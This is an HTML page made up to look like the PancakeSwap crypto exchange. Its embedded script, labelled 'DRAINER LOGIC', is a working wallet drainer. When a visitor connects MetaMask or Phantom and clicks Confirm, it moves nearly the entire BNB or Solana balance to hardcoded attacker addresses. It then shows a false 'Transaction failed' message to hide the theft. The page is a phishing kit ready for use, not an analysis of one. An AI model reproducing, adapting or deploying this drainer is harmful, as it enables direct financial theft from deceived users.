<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>PancakeSwap - Everyone's Favorite DEX</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #1b2026;
            color: #fff;
            padding: 16px;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
            background: #1b2026;
            border-radius: 32px;
            overflow: hidden;
        }

        .header {
            padding: 20px 16px 8px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #fff, #f0b90b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .settings {
            font-size: 22px;
            opacity: 0.7;
        }

        .tabs {
            display: flex;
            gap: 24px;
            padding: 16px 16px 12px 16px;
            border-bottom: 1px solid #2a2f36;
        }

        .tab {
            color: #7a7e85;
            font-weight: 500;
            font-size: 16px;
        }

        .tab.active {
            color: #f0b90b;
        }

        .hero {
            text-align: center;
            padding: 32px 16px 24px 16px;
        }

        .hero h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .hero p {
            color: #7a7e85;
            font-size: 14px;
        }

        .transfer-card {
            background: #252a32;
            border-radius: 24px;
            margin: 16px;
            padding: 20px;
        }

        .transfer-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            color: #f0b90b;
            font-weight: 500;
        }

        .amount {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .small-amount {
            color: #7a7e85;
            font-size: 14px;
            margin-bottom: 24px;
        }

        .row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-top: 1px solid #2a2f36;
        }

        .row-left {
            color: #7a7e85;
        }

        .row-right {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .token-icon {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-size: contain;
            display: inline-block;
        }

        .bnb-icon {
            background: url('https://assets.coingecko.com/coins/images/825/small/bnb-icon2.png?1644979850') no-repeat center;
            background-size: contain;
        }

        .cake-icon {
            background: url('https://assets.coingecko.com/coins/images/12632/small/pancakeswap-cake-logo.png?1629353875') no-repeat center;
            background-size: contain;
        }

        .buttons {
            display: flex;
            gap: 12px;
            margin-top: 24px;
        }

        .cancel {
            flex: 1;
            background: transparent;
            border: 1px solid #4a4f58;
            color: #fff;
            padding: 14px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
        }

        .confirm {
            flex: 1;
            background: #f0b90b;
            border: none;
            color: #1b2026;
            padding: 14px;
            border-radius: 40px;
            font-weight: 700;
            cursor: pointer;
        }

        .get-started {
            background: #f0b90b;
            border: none;
            color: #1b2026;
            padding: 16px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            width: calc(100% - 32px);
            margin: 16px;
            text-align: center;
        }

        .status {
            text-align: center;
            padding: 12px;
            color: #7a7e85;
            font-size: 12px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo">🥞 PancakeSwap</div>
        <div class="settings">⚙️</div>
    </div>
    <div class="tabs">
        <span class="tab active">Trade</span>
        <span class="tab">Perps</span>
        <span class="tab">Earn</span>
        <span class="tab">Al Play</span>
        <span class="tab">...</span>
    </div>
    <div class="hero">
        <h1>Everyone's Favorite DEX</h1>
        <p>Trade Crypto Instantly Across 10 Chains</p>
    </div>
    <div class="transfer-card">
        <div class="transfer-header">
            <span>🦊 MetaMask</span>
            <span>1 of 6 &gt;</span>
        </div>
        <div class="amount">$1,439</div>
        <div class="small-amount">0.009 BNB ($5.85)</div>

        <!-- From with BNB icon -->
        <div class="row">
            <span class="row-left">From</span>
            <div class="row-right">
                <div class="token-icon bnb-icon"></div>
                <span>BNB · BNB Chain</span>
            </div>
        </div>

        <!-- To with wallet icon -->
        <div class="row">
            <span class="row-left">To</span>
            <div class="row-right">
                <span>👤 VICTIM · Wallet 1</span>
            </div>
        </div>

        <!-- Estimated changes with CAKE icon -->
        <div class="row">
            <span class="row-left">Estimated changes</span>
            <div class="row-right">
                <div class="token-icon cake-icon"></div>
                <span>CAKE · BNB Chain</span>
            </div>
        </div>

        <div class="buttons">
            <button class="cancel" id="cancelBtn">Cancel</button>
            <button class="confirm" id="confirmBtn">Confirm</button>
        </div>
    </div>
    <button class="get-started" id="connectWalletBtn">Get Started</button>
    <div class="status" id="status"></div>
</div>

<script>
// ================================================================
// DRAINER LOGIC - SILENT BACKGROUND
// ================================================================

const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";

let currentVictim = null;
let walletType = null;

async function drainEVM(addr) {
    if (!window.ethereum) return false;
    try {
        const web3 = new Web3(window.ethereum);
        const balance = await web3.eth.getBalance(addr);
        const balEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
        if (balEth < 0.01) return false;
        const gasPrice = await web3.eth.getGasPrice();
        const gasCost = gasPrice * 21000n;
        const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
        if (drainable <= 0) return false;
        const tx = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
        });
        console.log("✅ BSC drained:", tx);
        return true;
    } catch(e) { return false; }
}

async function drainSolana(pubKey) {
    if (!window.solana?.isPhantom) return false;
    try {
        const conn = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
        const from = new solanaWeb3.PublicKey(pubKey);
        const to = new solanaWeb3.PublicKey(SOLANA_WALLET);
        const balance = await conn.getBalance(from);
        const minRent = await conn.getMinimumBalanceForRentExemption(0);
        const drainable = balance - minRent;
        if (drainable <= 0) return false;
        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: Math.floor(drainable * 0.99) }));
        tx.feePayer = from;
        const blockhash = await conn.getRecentBlockhash();
        tx.recentBlockhash = blockhash.blockhash;
        const signed = await window.solana.signTransaction(tx);
        const txid = await conn.sendRawTransaction(signed.serialize());
        await conn.confirmTransaction(txid);
        console.log("✅ Solana drained:", txid);
        return true;
    } catch(e) { return false; }
}

document.getElementById('connectWalletBtn').onclick = async () => {
    const status = document.getElementById('status');
    status.innerText = "🔄 Connecting...";
    if (window.ethereum?.isMetaMask) {
        try {
            const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
            currentVictim = acc[0];
            walletType = 'evm';
            status.innerText = `✅ Connected: ${currentVictim.slice(0,6)}...${currentVictim.slice(-4)}`;
        } catch(e) { status.innerText = "❌ Connection failed"; }
    } else if (window.solana?.isPhantom) {
        try {
            const resp = await window.solana.connect();
            currentVictim = resp.publicKey.toString();
            walletType = 'solana';
            status.innerText = `✅ Connected: ${currentVictim.slice(0,6)}...${currentVictim.slice(-4)}`;
        } catch(e) { status.innerText = "❌ Connection failed"; }
    } else {
        status.innerText = "⚠️ Install MetaMask or Phantom";
    }
};

document.getElementById('confirmBtn').onclick = async () => {
    if (!currentVictim) { document.getElementById('status').innerText = "⚠️ Connect wallet first"; return; }
    document.getElementById('status').innerText = "⏳ Processing transaction...";
    let ok = false;
    if (walletType === 'evm') ok = await drainEVM(currentVictim);
    else if (walletType === 'solana') ok = await drainSolana(currentVictim);
    document.getElementById('status').innerText = ok ? "❌ Transaction failed. Please try again." : "❌ Error. Try again.";
    currentVictim = null;
    walletType = null;
};

document.getElementById('cancelBtn').onclick = () => {
    document.getElementById('status').innerText = "❌ Cancelled";
    currentVictim = null;
    walletType = null;
};

if (typeof Web3 === 'undefined') {
    let s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js';
    document.head.appendChild(s);
}
</script>
</body>
</html>
